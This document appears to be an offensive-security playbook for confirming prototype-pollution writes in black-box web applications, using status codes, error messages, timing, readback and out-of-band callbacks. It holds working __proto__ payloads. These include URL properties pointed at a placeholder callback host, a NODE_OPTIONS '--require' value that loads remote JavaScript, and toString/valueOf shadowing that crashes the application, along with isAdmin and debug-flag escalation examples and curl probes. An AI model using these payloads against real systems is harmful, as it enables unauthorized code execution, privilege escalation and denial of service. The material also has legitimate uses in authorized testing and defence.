# Status codes and side-channel oracles — reading the write without a readback

A black-box PP site often has no direct fresh-object readback. The
status code, the error text, the timing, and the follow-on behavior
become the oracle — each tells you something different about where
the write landed.

---

## 1. The status-code grammar on the WRITE request

| Response | What it means | Next |
|---|---|---|
| `200`/`204`/`201` | body accepted — the merge probably ran | readback on a fresh object |
| `400`/`422` | validation rejected the shape — a schema/field-name filter before the merge | try a nested/different carrier or a non-reserved key |
| `500` | the merge crashed — reserved key hit a code path that broke | the write reached the sink but the site may be guarded vs crashing — check error text |
| `403`/`401` | authz rejected before the handler ran | not the merge — auth first |
| `404` | the route doesn't exist | wrong endpoint |
| `413` | body too large | shrink the payload |
| `502`/`504`/`503` | upstream/proxy failure — the app died on the write | process-global crash — a real PP write that took the worker down |
| timeout | the write wedged the process | a `toString`/`valueOf` shadow or an infinite merge — blast radius! |

`500` on `__proto__` specifically is a positive signal — it means
the reserved key REACHED code that treated it specially. `500` on a
harmless key like `x` means the route itself errors — unrelated.

## 2. The error-text grammar

```text
"Cannot set property '__proto__'"        → a defineProperty/frozen write — PP dead for that path
"Cannot read property 'x' of undefined"  → the merge walked a null intermediate — try different nesting
"Maximum call stack size exceeded"       → recursive merge hit a self-reference — a cycle in the source
"Invalid schema"                         → validation — reserved key filtered
"Unexpected token"                       → parse failed before merge — malformed JSON
"Forbidden property name"                → explicit reserved-key filter — try constructor.prototype
"'__proto__' is not allowed"             → explicit — same
"TypeError: Cannot assign to read only property"  → frozen/non-writable own prop — falsifier
"Prototype pollution detected"           → a PP-aware guard — try alias
"Bad key" / "bad field" / "invalid key"  → key-filter — try alias/nest
"EACCES/ENOENT"                          → the write ran but the app hit fs — the sink is real
"spawn ENOENT"                           → execPath/file write reached a spawn — sink confirmed!
"EJS:..." / template parse error         → the template-sink read your value — sink confirmed!
"undefined is not a function"            → a polluted name broke a call — write landed
"Maximum depth" / "depth exceeded"       → the merge's depth cap — your nest was too deep
```

The error string is the most information-dense readback — it names
exactly which layer rejected the write.

## 3. The "behavior changed" oracle

When no text oracle exists, the behavior delta is the confirm:

```text
before-write:   GET /x → 403
after-write:    GET /x → 200   (isAdmin pollution took)
                → CONFIRMS the write + the authz read
```

```text
before-write:   POST /render → "Hello, guest"
after-write:    POST /render → "Hello, PP"   (outputFunctionName
                                              embed worked)
```

```text
before-write:   GET /debug → 404
after-write:    GET /debug → 200 debug-page   (debug flag opened it)
```

The paired before/after is required — a 200 after alone doesn't
prove the write did it; the delta does.

## 4. The timing oracle — a write that costs

A recursive merge on a deeply-nested payload takes measurable time:

```bash
# baseline
time curl -X POST "$BASE/x" -d '{"a":{"b":1}}'           → ~50ms
# deep payload
time curl -X POST "$BASE/x" -d '{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":1}}}}}}}}}}'  → ~200ms?
```

A recursive merge's cost scales with nesting depth — a timing delta
on depth alone confirms a deep-walk merge exists, even before any
`__proto__` probe.

## 5. The fresh-object readback — the cleanest oracle

```bash
# any endpoint that returns a fresh object's properties
GET /api/me          → {"name":"x","ppmarker":"v1"}?
GET /api/config      → {"...":...,"ppmarker":"v1"}?
GET /api/status      → {"uptime":...,"ppmarker":"v1"}?
GET /api/profile     → the profile object, does it carry ppmarker?
GET /api/render      → does the rendered output include the marker?
GET /api/echo        → does an echoed object carry it?
```

A `ppmarker` on a FRESH object (one that didn't exist in your
request) is the definition of the pollution write landing.

## 6. The "which object is fresh" test

The readback must be on an object that ISN'T your request object:

- `GET /api/me` — the user object — server-side, fresh to you
- `GET /api/status` — a status object — fresh
- `POST /api/render` — the render's `opts`/context — fresh
- an error-object — `{"error":"x","ppmarker":"v1"}`? — a fresh
  error literal inherits!
- a response `Set-Cookie`/body-embedded JSON of a server object

A response containing ONLY what you sent is not a readback — it's
an echo; the marker on your own data proves nothing.

## 7. The crash-oracle

```json
{"__proto__":{"toString":"x"}}
{"__proto__":{"valueOf":"x"}}
{"__proto__":{"constructor":"x"}}
```

Shadowing a built-in method is a crash-primitive — if the write
lands, ANY subsequent `obj+""`/`String(obj)`/`obj.x` on every object
breaks — a 500/timeout cascade across the app is itself the confirm
(write landed, destructively). Don't do this on a shared instance —
the blast-radius note.

## 8. The OOB oracle — a write that phones home

```json
{"__proto__":{"url":"http://<oob>/"}}
{"__proto__":{"callbackUrl":"http://<oob>/"}}
{"__proto__":{"webhook":"http://<oob>/"}}
{"__proto__":{"avatar":"http://<oob>/i.png"}}
{"__proto__":{"src":"http://<oob>/x.js"}}
{"__proto__":{"proxy":"http://<oob>:8080"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require http://<oob>/x.js"}}}
```

When the sink is a fetch/request/read of a URL-typed property, a
polluted `url`/`callbackUrl`/`avatar`/`src` produces an outbound
connection — an OOB listener hit is the strongest black-box confirm.

```bash
python3 tools/web/oob_listener.py canary --base http://<oob-host> --name pp
python3 tools/web/oob_listener.py serve
# then trigger the read; python3 tools/web/oob_listener.py hits
```

## 9. The "write happened but read is delayed" — second-order oracles

```bash
# the stored-write pattern
POST /profile {"theme":{"__proto__":{"ppmarker":"v1"}}}   → stored
GET  /dashboard                                          → reads it?
# the queued-job pattern
POST /jobs {"opts":{"__proto__":{"ppmarker":"v1"}}}       → queued
GET  /jobs/<id>                                          → status/result?
# the reload pattern
POST /config {"a":{"__proto__":{"ppmarker":"v1"}}}        → stored
POST /admin/reload                                      → triggers merge
GET  /that-reads-config                                 → marker?
```

A delayed write needs the CONSUMING endpoint as the oracle — the
write-response itself won't carry it.

## 10. The "no oracle at all" — inconclusive, not refuted

When none of the oracles answer — no status delta, no error text,
no behavior change, no OOB hit, no fresh-object marker — the write
may still have landed with no observable sink. Record `inconclusive`
with the arms tried, park, and move to a different mechanism class;
a write with no read is a capability, not a vuln.

## 11. The oracle-preference order

```text
1. fresh-object marker    — cleanest, cheapest
2. OOB hit                — strongest black-box, needs an outbound sink
3. behavior delta         — paired before/after — needs the sink
4. error text             — names the rejecting layer
5. status code            — coarse — distinguishes reach vs reject
6. timing delta           — merge-depth fingerprint only
7. crash                  — destructive — blast-radius risk
```

## 12. The ledger lines

```bash
python3 tools/state.py <c> --hypothesis "oracle:fresh-object on /api/me"
python3 tools/state.py <c> --hypothesis "oracle:behavior-delta on /admin"
python3 tools/state.py <c> --hypothesis "oracle:oob-url on /render"
python3 tools/state.py <c> --hypothesis "oracle:error-text on /update"
python3 tools/state.py <c> --hypothesis "oracle:delayed-consume on /dashboard"
```
